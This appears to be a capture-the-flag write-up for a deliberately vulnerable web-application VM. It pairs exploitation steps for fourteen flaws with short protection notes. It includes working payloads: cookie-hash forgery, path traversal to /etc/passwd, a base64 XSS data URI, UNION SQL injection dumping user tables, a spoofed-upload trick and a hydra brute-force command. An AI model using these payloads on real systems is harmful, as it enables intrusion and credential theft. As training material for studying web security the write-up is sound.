
# Table of Contents

1.  [Prerequesite](#org2d9b5c7)
2.  [hidden_attribute](#org6d4ed72)
    1.  [Vulnerability](#org1d307f1)
    2.  [Protection](#org8b4fc21)
3.  [csrf_cookie](#org80f7126)
    1.  [Vulnerability](#org6ce2e6c)
    2.  [Protection](#org4709af1)
4.  [informations_leaks](#orgddc9ff7)
    1.  [Vulnerability](#org544e94d)
    2.  [Protection](#orgbceed3d)
5.  [insecure_path](#org5cc9184)
    1.  [Vulnerability](#org81e7d39)
    2.  [Protection](#org8e2b5f0)
6.  [redirection](#org707b758)
    1.  [Vulnerability](#orgb8e86d2)
    2.  [Protection](#org80b780e)
7.  [local_file_inclusion](#org2902f39)
    1.  [Vulnerability](#orgcf06a4a)
    2.  [Protection](#org8782e95)
8.  [idor_src](#orgf85ced3)
    1.  [Vulnerability](#org1aa44fd)
    2.  [Protection](#org46d6ec9)
9.  [form_check](#orge0def8d)
    1.  [Vulnerability](#org4c226fe)
    2.  [Proection](#org01188e5)
10. [cors](#org27598bb)
    1.  [Vulnerability](#orgef071e7)
    2.  [Protection](#orgb45a506)
11. [insecure_upload](#orgc339244)
    1.  [Vulnerability](#org91e06a2)
    2.  [Protection](#org469521c)
12. [xss_stored](#org40389f3)
    1.  [Vulnerability](#orgdd4a5e7)
    2.  [Protection](#orge057525)
13. [sql_injection_member](#orgb9facf7)
    1.  [Vulnerability](#org608156b)
    2.  [Protection](#orgfbdc5e3)
14. [sql_injection_image](#org5c0e747)
    1.  [Vulnerability](#orgfc4f9d0)
    2.  [Protection](#org1e600fe)
15. [bruteforce_login_page](#org282b0e1)
    1.  [Vulnerability](#orge11f7dc)
    2.  [Protection](#orgc4ac851)



<a id="org2d9b5c7"></a>

# Prerequesite

Lauch the VM and access to the IP indicated.


<a id="org6d4ed72"></a>

# hidden_attribute


<a id="org1d307f1"></a>

## Vulnerability

On the page <http://192.168.56.105/index.php?page=signin> there is link to recover password and on this page there is an hidden form.

1.  insepect the page
2.  fill the form
3.  click on the submit button


<a id="org8b4fc21"></a>

## Protection

Don&rsquo;t use hidden tag in html for sensitive information !


<a id="org80f7126"></a>

# csrf_cookie


<a id="org6ce2e6c"></a>

## Vulnerability

The website gives us a cookie in order to check if we are admin or not. This cookie is a simple md5 hash which means &rsquo;false&rsquo;. We can replace it by the corresping hash for &rsquo;true&rsquo;.

1.  `hashid 68934a3e9455fa72420237eb05902327`
2.  `echo -n "true" | md5`
3.  replace cookie with the result of the echo command.
4.  reload the page


<a id="org4709af1"></a>

## Protection

A boolean is not enough, there must be a complex system of identification by user in the backend. (and don&rsquo;t use explicit sentences as &rsquo;I_am_admin&rsquo;). It&rsquo;s also important to use the &rsquo;SameSite&rsquo; attribute for cookies.


<a id="orgddc9ff7"></a>

# informations_leaks


<a id="org544e94d"></a>

## Vulnerability

By doing some fuzzing on the website, we can found the file **robots.txt** which reveals informations of the content of the site.
On the page <http://192.168.56.105/whatever/> there is a **htpasswd** file.

1.  `ffuf -w ./informations_leaks/ressources/common.txt:FUZZ -u "http://192.168.56.105/FUZZ"`
2.  go to <http://192.168.56.105/robots.txt>
3.  go to <http://192.168.56.105/whatever/>
4.  `wget http://192.168.56.105/whatever/htpasswd`
5.  use <https://crackstation.net/> to decode the hash
6.  go to <http://192.168.56.105/admin/>
7.  log-in with root:dragon


<a id="orgbceed3d"></a>

## Protection

Don&rsquo;t store sensitive informations in the **robots.txt** file, assume that attackers will pay close attention to any locations identified in the file.


<a id="org5cc9184"></a>

# insecure_path


<a id="org81e7d39"></a>

## Vulnerability

On the page <http://192.168.56.105/.hidden/> found by the **robots.txt** there is some kind of labyrinth to protect the flag. But it stills vulnerable to crawling.

1.  cd ./insecure_path/ressources
2.  `bash crawl.sh "http://192.168.56.105/.hidden/" url_1 url_2 url_3`
3.  `grep -v "gauche\|droite\|dessus\|dessous\|aussi\|bon\|non" result.txt`


<a id="org8e2b5f0"></a>

## Protection

Don&rsquo;t hide important informations like that. Use authentication or **htaccess** file to protect the folder.


<a id="org707b758"></a>

# redirection


<a id="orgb8e86d2"></a>

## Vulnerability

In the footer of the main page, the website has redirection of social media. We can change these redirection with anything we want and potentially to malicious pages.

1.  change &ldquo;site=facebook&rdquo; by &ldquo;site=google&rdquo;
2.  click on the link


<a id="org80b780e"></a>

## Protection

It&rsquo;s possible to check the redirection with some arrays, so it would not be possible to redirect on anything other that we predefined.


<a id="org2902f39"></a>

# local_file_inclusion

Local File Inclusion is an attack technique in which attackers trick a web application into either running or exposing files on a web server. On any page on the website, there is an attribute **page** in the url.


<a id="orgcf06a4a"></a>

## Vulnerability

1.  change <http://192.168.56.105/index.php?page=sigin> by

<http://192.168.56.105/index.php?page=../../../../../../../etc/passwd>


<a id="org8782e95"></a>

## Protection

Use an array of valid url, the attacker will have access only to these arrays.


<a id="orgf85ced3"></a>

# idor_src


<a id="org1aa44fd"></a>

## Vulnerability

Indirect object references is a vulnerability that arises when an application uses user-supplied input to access objects directly. An image is clickable on the main page and redirect us to <http://192.168.56.105/?page=media&src=nsa> . There is an object tag in the page that displays the content of the src in url. We can replace the src to make an XSS request.

1.  replace **src=nsa** by **src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=**


<a id="org46d6ec9"></a>

## Protection

Predefined the valid sources and don&rsquo;t use the input of the user.


<a id="orge0def8d"></a>

# form_check


<a id="org4c226fe"></a>

## Vulnerability

On the page <http://192.168.56.105/index.php?page=survey> there is a survey where we vote for people. By doing a vote, a POST request is made, we can change the values of this request.

1.  press F12
2.  vote for a person
3.  go to the &rsquo;network&rsquo; tab
4.  edit the request and change the value by 42
5.  send and look at the response


<a id="org01188e5"></a>

## Proection

Sanitize the input of the form in the backend and not only in the frontend !


<a id="org27598bb"></a>

# cors


<a id="orgef071e7"></a>

## Vulnerability

Click on the copyright in the bottom of the page. There is some comments in the source page which give us an hint. **&ldquo;You must comming from : &rdquo;<https://www.nsa.gov/>&ldquo; to go to the next step** and **the browser ft_borntosec will help you**.
We need to change the referrer and the user agent in request.

1.  press F12
2.  reload the page
3.  edit the request, change the referrer by **&ldquo;<https://www.nsa.gov/>&rdquo;** and the user-agent by **&ldquo;ft_borntosec&rdquo;**
4.  send and look at the response


<a id="orgb45a506"></a>

## Protection

The referrer and the user-agent are not enough to check the validity of a request. The Cross Origin Request must be enabled and configured.


<a id="orgc339244"></a>

# insecure_upload


<a id="org91e06a2"></a>

## Vulnerability

It&rsquo;s possible to upload an image on the page <http://192.168.56.105/?page=upload> . The website only check the header of the request for the uploaded file.

1.  press F12
2.  upload a .php file
3.  change the request, **Content-Type: text/php** by **Content-Type: images/jpeg**
4.  send and look at the response


<a id="org469521c"></a>

## Protection

Looking at the header is not enough.


<a id="org40389f3"></a>

# xss_stored


<a id="orgdd4a5e7"></a>

## Vulnerability

On the page <http://192.168.56.103/index.php?page=feedback>  it&rsquo;s possible for the users to leave feedbacks. Any comments leads to XSS and gives the flag. This is exagerated but real XSS attacks can lead to serious threats on websites, it can steal cookies, make request for any users who visite the page &#x2026;


<a id="orge057525"></a>

## Protection

SANTIZE THE INPUT ! Use appropriate response headers. To prevent XSS in HTTP responses that aren&rsquo;t intended to contain any HTML or JavaScript, you can use the Content-Type and X-Content-Type-Options headers to ensure that browsers interpret the responses in the way you intend.


<a id="orgb9facf7"></a>

# sql_injection_member


<a id="org608156b"></a>

## Vulnerability

On the page <http://192.168.56.105/index.php?page=member> we can search users by their &rsquo;id&rsquo;. If we enter a letter for example, an error is displayed which reveals that it reads sql commands.

1.  1 OR 1
2.  5 UNION SELECT database(),2
3.  5 UNION SELECT table_schema,table_name FROM information_schema.columns
4.  5 UNION SELECT table_name,column_name FROM information_schema.columns
5.  5 UNION SELECT user_id,planet FROM users
6.  5 UNION SELECT user_id,countersign FROM users
7.  5 UNION SELECT user_id,commentaire FROM users
8.  `echo -n 'fortytwo' | sha2`


<a id="orgfbdc5e3"></a>

## Protection

Sanitize the input of form and use parametrized queries.
Parameterized queries are a means of pre-compiling an SQL statement so that you can then supply the parameters in order for the statement to be executed. This method makes it possible for the database to recognize the code and distinguish it from input data.


<a id="org5c0e747"></a>

# sql_injection_image


<a id="orgfc4f9d0"></a>

## Vulnerability

Same as **sql_injection_member** but on the page <http://192.168.56.105/?page=searchimg>.

1.  5 UNION SELECT table_schema,table_name FROM information_schema.columns
2.  5 UNION SELECT table_name,column_name FROM information_schema.columns
3.  5 UNION SELECT title,comment FROM list_images
4.  `echo -n 'albatroz' | sha2`


<a id="org1e600fe"></a>

## Protection

Sanitize the input of form and use parametrized queries.
Parameterized queries are a means of pre-compiling an SQL statement so that you can then supply the parameters in order for the statement to be executed. This method makes it possible for the database to recognize the code and distinguish it from input data.


<a id="org282b0e1"></a>

# bruteforce_login_page


<a id="orge11f7dc"></a>

## Vulnerability

There is a login page, <http://192.168.56.103/index.php?page=signin>. We does not know any creds so we can bruteforce it.

1.  `hydra -l admin -P /usr/share/SecLists/Passwords/Common-Credentials/top-passwords-shortlist.txt '192.168.56.103' http-get-form '/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif' -I -F` We try each password in the file.txt for the username admin until the response does not containt &rsquo;WrongAnswer.gif&rsquo;.
    1.  log-in as admin:shadow


<a id="orgc4ac851"></a>

## Protection

Use strict policy for passwords ! Also, block the ip address who make too many requests.

